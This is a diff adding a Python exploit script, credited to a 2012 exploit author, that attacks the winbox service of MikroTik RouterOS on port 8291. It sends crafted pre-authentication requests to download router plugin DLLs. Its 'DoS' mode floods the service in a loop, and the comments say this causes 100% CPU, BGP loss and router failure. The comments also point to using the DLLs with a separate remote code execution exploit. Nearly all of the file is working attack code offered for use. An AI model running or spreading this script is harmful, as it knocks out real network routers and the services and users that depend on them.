@@ -1,0 +1,243 @@
+#!/usr/bin/python
+# Exploit Title: 	Mikrotik Router Remote Denial Of Service attack
+# Date: 			19/4/2012
+# Author: 			PoURaN @ 133tsec.com
+# Software Link: 	http://www.mikrotik.com
+# Version: 			All mikrotik routers with winbox service enabled are affected (still a 0day 30/5/2012)
+# Tested on: 		Mikrotis RouterOS 2.9.6 up to 5.15
+#
+#  Vulnerability Description 
+# ===========================
+# DETAILS & PoC VIDEO : http://www.133tsec.com/2012/04/30/0day-ddos-mikrotik-server-side-ddos-attack/
+# The denial of service, happens on mikrotik router's winbox service when
+# the attacker is requesting continuesly a part of a .dll/plugin file, so the service 
+# becomes unstable causing every remote clients (with winbox) to disconnect
+# and denies to accept any further connections. That happens for about 5 minutes. After
+# the 5 minutes, winbox is stable again, being able to accept new connections.
+# If you send the malicious packet in a loop (requesting  part of a file right after
+# the service becoming available again) then you result in a 100% denial of winbox service.
+# While the winbox service is unstable and in a denial to serve state, it raises router's CPU 100%
+# and other actions. The "other actions" depends on the router version and on the hardware.
+# For example on Mikrotik Router v3.30 there was a LAN corruption, BGP fail, whole router failure
+# 	=> Mikrotik Router v2.9.6 there was a BGP failure
+#	=> Mikrotik Router v4.13 unstable wifi links
+#	=> Mikrotik Router v5.14/5.15 rarely stacking
+#	=>>> Behaviour may vary most times, but ALL will have CPU 100% . Most routers loose BGP after long time attack <<<=
+#
+#
+#  The exploit
+# =============
+# This is a vulnerability in winbox service, exploiting the fact that winbox lets you download files/plugins
+# that winbox client needs to control the server, and generally lets you gain basic infos about the service BEFORE
+# user login!
+# Sending requests specially crafted for the winbox service, can cause a 100% denial of winbox service (router side).
+# This script, offers you the possibility to download any of the dlls that can be downloaded from the router one-by-one
+# or alltogether! (look usage for more info) .. The file must be contained in the router's dll index.
+# The dlls downloaded, are in the format of the winbox service.. Meaning that they are compressed with gzip and they
+# have 0xFFFF bytes every 0x101 bytes (the format that winbox client is expecting the files)
+# These DLLs can be used by the "Winbox remote code execution" exploit script ;)
+#
+#  Usage
+# =======
+# Use the script as described below:
+# 1. You can download ALL the files of the router's dll index using the following command:
+#	python mkDl.py 10.0.0.1 * 1
+#	the "1" in the end, is the speed.. "Speed" is a factor I added, so the script delays a bit while receiving
+#	information from the server. It is a MUST for remote routers when they are in long distance (many hops) to use
+#	a slower speed ( 9 for example ).
+#	Also in the beginning of the dlls file list, script shows you the router's version (provided by router's index)
+# 2. You can download a specific .dll file from the remote router.
+#	python mkDl.py 10.67.162.1 roteros.dll 1
+#	In this example i download roteros.dll (which is the biggest and main plugin) with a speed factor of 1 (very fast)
+#	Because roteros and 1-2 other files are big, you have to request them in different part (parts of 64k each)
+#	That is a restriction of winbox communication protocol.
+#	If you don't know which file to request, make a "*" request first (1st usage example), see the dlls list, and press ctrl-c
+#	to stop the script.
+# 3. You can cause a Denial Of Service to the remote router.. Means denial in winbox service or more (read above for more)
+#	python mkDl.py 10.67.162.1 DoS
+#	This command starts requesting from router's winbox service the 1st part of roteros.dll looping the request
+#	and causing DoS to the router. The script is requesting the file till the router stops responding to the port (8291)
+#	Then it waits till the service is up again (using some exception handling), then it requests again till the remote
+#	service is down again etc etc... The requests lasts for about 2 seconds, and the router is not responding for about
+#	5 minutes as far as i have seen from my tests in different routeros versions.
+#
+#	<> Greetz to mbarb, dennis, andreas, awmn and all mighty researchers out there! keep walking guys <>
+#
+import socket, sys, os, struct, random, time
+
+def InitConnection(mikrotikIP, speed):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((mikrotikIP, 8291))
+	s.send(winboxStartingIndex)
+	data = s.recv(1024)			# receiving dll index from server
+	time.sleep(0.001*speed)
+	if data.find("\xFF\x02"+"index"+"\x00") > -1:
+		print "[+] Index received!"
+	else:
+		print "[+] Wrong index.. Exiting.."
+		sys.exit(0)
+	return s
+
+def download(filename, speed, s):
+	f = open(filename, 'wb')
+	if len(filename) < 13 and len(filename) > 6:
+		print "[+] Requesting file ", filename, ' <->'
+		winboxStartingFileReq = RequestHeader + filename.ljust(12, '\x00') + RequestFirstFooter
+		s.send(winboxStartingFileReq)
+		time.sleep(0.001*speed)
+		dataReceived = s.recv(1)
+		if dataReceived[0:1]=='\xFF':
+			print "[+] Receiving the file..."
+			f.write(dataReceived)						# written 1st byte
+			time.sleep(0.001*speed)
+			dataReceived = s.recv(0x101)				# 0x100 + 1
+			nextPartFingerprint = struct.unpack('>H', dataReceived[14:16])[0]
+			if dataReceived[0:1]=='\x02':
+				time.sleep(0.001*speed)
+				f.write(dataReceived)					# written 1st chunk 0x102 bytes with header in file.
+				dataReceived = s.recv(0x102)			# 1st sequence of (0xFF 0xFF)
+				bytesToRead = int(dataReceived[len(dataReceived)-2].encode('hex'), 16) + 2
+				f.write(dataReceived)					# write the next 0x102 bytes (total 0x102+0x102 in file)
+			else:
+				print "[-] Wrong data received..(2)"
+				sys.exit(0)
+		else:
+			print "[-] Wrong data received..(1)"
+			sys.exit(0)
+		
+		finalPart=0
+		bigFileCounter = 0xFFED
+		packetsCounted=0		# counter for the 0x101 packet counts. Every time a file is requested this counter is 0
+		fileRequested=0			# every time a file needs to be requested more than 1 time, this is it's counter.
+		while 1:								# header of file done.. Now LOOP the body..
+			packetsCounted+=1	# dbg
+			time.sleep(0.001*speed)
+			dataReceived = s.recv(bytesToRead)
+			f.write(dataReceived)
+			if (bytesToRead <> len(dataReceived)) and packetsCounted==255:	# an den diavazei osa bytesToRead prepei, simainei oti eftase sto telos i lipsi tou part pou katevazoume
+				packetsCounted = -1
+				print '[+] Next file part : ', fileRequested
+				s.send(RequestHeader + filename.ljust(12, '\x00') + '\xFF\xED\x00' + struct.pack('=b',fileRequested) +	struct.pack('>h',bigFileCounter))
+				time.sleep(0.001*speed)
+				dataReceived = s.recv(0x101 + 2)			# Reads the new header of the new part!!!
+				nextPartFingerprint = struct.unpack('>H', dataReceived[14:16])[0]
+				f.write(dataReceived)
+				bytesToRead = int(dataReceived[len(dataReceived)-2].encode('hex'), 16)
+				fileRequested += 1
+				bigFileCounter -= 0x13
+			bytesToRead = int(dataReceived[len(dataReceived)-2].encode('hex'), 16)		# den prostheto 2 tora giati to teleutaio den einai ff.. einai akrivos to size pou paramenei..
+			if bytesToRead==0xFF:			# kalipto tin periptosi opou to teleutaio struct den einai ff alla exei to size pou apomenei
+				bytesToRead += 2
+			if bytesToRead != 0x101 and nextPartFingerprint < 65517:	# dikaiologountai ta liga bytes otan teleiose ena apo ta parts tou file
+				time.sleep(0.001*speed)
+				dataReceived = s.recv(bytesToRead)
+				f.write(dataReceived)
+				break
+			if bytesToRead != 0x101 and nextPartFingerprint==65517:		# ligotera bytes KAI fingerprint 65517 simainei corrupted file..
+				print '[-] File download terminated abnormaly.. please try again probably with a slower speed..'
+				sys.exit(0)
+		if fileRequested < 1:	print '[+] File was small and was downloaded in one part\n[+] Downloaded successfully'
+		else:	print '[+] File '+filename+' downloaded successfully'
+	f.close()
+	s.close()
+
+	
+def Flood(s):
+	filename = 'roteros.dll'
+	f = 'we\'r not gonna use I/O to store the data'
+	print "[+] Requesting file ", filename, ' till death :)'
+	time.sleep(1)
+	winboxStartingFileReq = RequestHeader + filename.ljust(12, '\x00') + RequestFirstFooter
+	s.send(winboxStartingFileReq)
+	time.sleep(0.001)
+	dataReceived = s.recv(1)
+	if dataReceived[0:1]=='\xFF':
+		f = dataReceived						# written 1st byte
+		time.sleep(0.001)
+		dataReceived = s.recv(0x101)				# 0x100 + 1
+		nextPartFingerprint = struct.unpack('>H', dataReceived[14:16])[0]
+		if dataReceived[0:1]=='\x02':
+			time.sleep(0.001)
+			f = dataReceived					# written 1st chunk 0x102 bytes with header in file.
+			dataReceived = s.recv(0x102)			# 1st sequence of (0xFF 0xFF)
+			bytesToRead = int(dataReceived[len(dataReceived)-2].encode('hex'), 16) + 2
+			f = dataReceived					# write the next 0x102 bytes (total 0x102+0x102 in file)
+		else:
+			print "[-] Wrong data received..(2)"
+			sys.exit(0)
+	else:
+		print "[-] Wrong data received..(1)"
+		sys.exit(0)
+	
+	finalPart=0
+	bigFileCounter = 0xFFED
+	packetsCounted=0		# counter for the 0x101 packet counts. Every time a file is requested this counter is 0
+	fileRequested=0			# every time a file needs to be requested more than 1 time, this is it's counter.
+	try:
+		while 1:
+			s.send(RequestHeader + filename.ljust(12, '\x00') + '\xFF\xED\x00' + struct.pack('=b',fileRequested) +	struct.pack('>h',bigFileCounter))
+			s.recv(1)
+			print '- Sending evil packet.. press CTRL-C to stop -'
+	except:
+		print 'Connection reseted by server.. trying attacking again'
+
+
+###############################################################################################################
+########################################### SCRIPT BODY STARTS HERE ###########################################
+global RequestHeader
+RequestHeader = ('\x12\x02')
+global RequestFirstFooter
+RequestFirstFooter = ('\xFF\xED\x00\x00\x00\x00')
+
+global winboxStartingIndex
+winboxStartingIndex=(RequestHeader + 'index' + '\x00'*7 + RequestFirstFooter)
+winboxStartingFileReq=(RequestHeader + '\x00'*12 + RequestFirstFooter)
+
+print '\n[Winbox plugin downloader]\n\n'
+
+if len(sys.argv)==3:
+	if sys.argv[2]=='DoS':							# if i combine both checks in 1st if, there will be error.. guess why.. ;)
+		print '[+] Hmmm we gonna attack it..'
+		time.sleep(1)
+		speed=1
+		mikrotikIP = sys.argv[1]
+		filename = sys.argv[2]
+		while 1:
+			time.sleep(1)
+			try:
+				s = InitConnection(mikrotikIP, speed)
+				Flood(s)
+			except:
+				time.sleep(1)
+
+if len(sys.argv)<>4:
+	print 'Usage : '+sys.argv[0]+' <mikrotik_ip> <filename_to_download> <speed>\n\t<speed>:\t [from 0 to 9] 1=faster, 9=slower but more reliable\n'
+	sys.exit(0)
+
+mikrotikIP = sys.argv[1]
+filename = sys.argv[2]
+speed = int(sys.argv[3])
+if speed>9 or speed<1:
+	print 'Speed must be between 1 and 9 else there are unexpected results!'
+	sys.exit(0)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((mikrotikIP, 8291))
+s.send(winboxStartingIndex)
+data = s.recv(1024)			# receiving dll index from server
+s.close()
+
+if filename.find('*') > -1:
+	DllList = data.split('\x0a')
+	print 'Mikrotik\'s version is '+DllList[1].split(' ')[3]+'\nThe following Dlls gonna be requested :'
+	for i in range(0, len(DllList)-1):
+		print DllList[i].split(' ')[2]
+	raw_input('> Press enter to continue <')
+	for extractedDlls in range(0, len(DllList)-1):
+		print "[+] Requesting ", DllList[extractedDlls].split(' ')[2]
+		filename=DllList[extractedDlls].split(' ')[2]
+		s = InitConnection(mikrotikIP, speed)
+		download(filename, speed, s)
+else:
+	s = InitConnection(mikrotikIP, speed)
+	download(filename, speed, s)
